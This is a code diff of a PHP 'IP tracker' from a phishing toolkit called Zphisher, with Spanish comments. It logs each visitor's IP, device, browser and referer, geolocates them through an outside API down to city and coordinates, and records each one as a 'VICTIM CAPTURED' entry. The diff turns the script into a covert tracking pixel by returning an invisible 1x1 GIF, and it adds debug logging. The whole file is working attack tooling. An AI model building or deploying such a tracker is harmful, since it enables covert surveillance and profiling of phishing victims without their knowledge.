@@ -1,4 +1,26 @@
 <?php
+/**
+ * ZPHISHER 2025 - IP TRACKER
+ * Versión con path absoluto
+ */
+
+// Path absoluto para garantizar que funcione
+$log_file = __DIR__ . '/ip.txt';
+$debug_file = __DIR__ . '/debug.txt';
+
+// DEBUG
+$debug_log = "=== DEBUG ===\n";
+$debug_log .= "Script path: " . __FILE__ . "\n";
+$debug_log .= "Log file: $log_file\n";
+$debug_log .= "HTTP_CLIENT_IP: " . ($_SERVER['HTTP_CLIENT_IP'] ?? 'not set') . "\n";
+$debug_log .= "HTTP_X_FORWARDED_FOR: " . ($_SERVER['HTTP_X_FORWARDED_FOR'] ?? 'not set') . "\n";
+$debug_log .= "REMOTE_ADDR: " . ($_SERVER['REMOTE_ADDR'] ?? 'not set') . "\n";
+
+// Intentar escribir debug
+$write_result = @file_put_contents($debug_file, $debug_log . "\n", FILE_APPEND);
+$debug_log .= "Write result: " . ($write_result !== false ? "SUCCESS ($write_result bytes)" : "FAILED") . "\n";
+
+// Captura de IP
 if(isset($_SERVER['HTTP_CLIENT_IP'])) {
     $ipaddr = $_SERVER['HTTP_CLIENT_IP'];
 } elseif(isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
@@ -15,6 +37,7 @@ $user_agent = $_SERVER['HTTP_USER_AGENT'];
 $timestamp = date('Y-m-d H:i:s');
 $referer = isset($_SERVER['HTTP_REFERER']) ? $_SERVER['HTTP_REFERER'] : 'Direct';
 
+// Funciones
 function getDeviceType($ua) {
     if(preg_match('/(android|webos|iphone|ipad|ipod|blackberry)/i', $ua)) return "Mobile";
     if(preg_match('/(tablet|ipad)/i', $ua)) return "Tablet";
@@ -52,13 +75,17 @@ $device = getDeviceType($user_agent);
 $browser = getBrowser($user_agent);
 $os = getOS($user_agent);
 
-// Geolocalización con más campos
+// Geolocalización
 $geo_data = @file_get_contents("http://ip-api.com/json/{$ipaddr}?fields=country,countryCode,region,regionName,city,zip,isp,org,lat,lon,timezone");
 $geo = json_decode($geo_data, true);
 
+file_put_contents($debug_file, "Geo API response: " . ($geo_data ?: 'empty') . "\n", FILE_APPEND);
+
+// Log formateado
 $log = "\n╔═══════════════════════════════════════════════════╗\n";
 $log .= "║  🎯 VICTIM CAPTURED - " . $timestamp . "  ║\n";
 $log .= "╚═══════════════════════════════════════════════════╝\n";
+$log .= "IP: " . $ipaddr . "\n";
 $log .= "🌐 IP Address : " . $ipaddr . "\n";
 
 if($geo && isset($geo['country'])) {
@@ -70,7 +97,7 @@ if($geo && isset($geo['country'])) {
     $log .= "📍 Coordinates: " . $geo['lat'] . ", " . $geo['lon'] . "\n";
     $log .= "🕐 Timezone   : " . $geo['timezone'] . "\n";
 } else {
-    $log .= "⚠️  Geolocation: Not available (local/private IP)\n";
+    $log .= "⚠️  Geolocation: Not available (localhost or private IP)\n";
 }
 
 $log .= "💻 Device     : " . $device . "\n";
@@ -80,13 +107,23 @@ $log .= "🔗 Referer    : " . $referer . "\n";
 $log .= "📱 User-Agent : " . $user_agent . "\n";
 $log .= str_repeat("─", 52) . "\n";
 
-file_put_contents('ip.txt', $log, FILE_APPEND);
+// Guardar con manejo de errores
+$write_success = @file_put_contents($log_file, $log, FILE_APPEND);
 
-// Respuesta JSON (para uso futuro con AJAX)
-header('Content-Type: application/json');
-echo json_encode([
-    'status' => 'success',
-    'ip' => $ipaddr,
-    'location' => isset($geo['city']) ? $geo['city'] . ', ' . $geo['country'] : 'Unknown'
-]);
+if($write_success === false) {
+    file_put_contents($debug_file, "ERROR: Cannot write to $log_file\n", FILE_APPEND);
+    file_put_contents($debug_file, "Permissions: " . decoct(fileperms(__DIR__) & 0777) . "\n", FILE_APPEND);
+} else {
+    file_put_contents($debug_file, "SUCCESS: Wrote $write_success bytes to $log_file\n", FILE_APPEND);
+}
+
+// Devolver imagen invisible
+header('Content-Type: image/gif');
+header('Cache-Control: no-cache, no-store, must-revalidate');
+header('Pragma: no-cache');
+header('Expires: 0');
+
+// GIF transparente 1x1 pixel
+echo base64_decode('R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7');
+exit;
 ?>
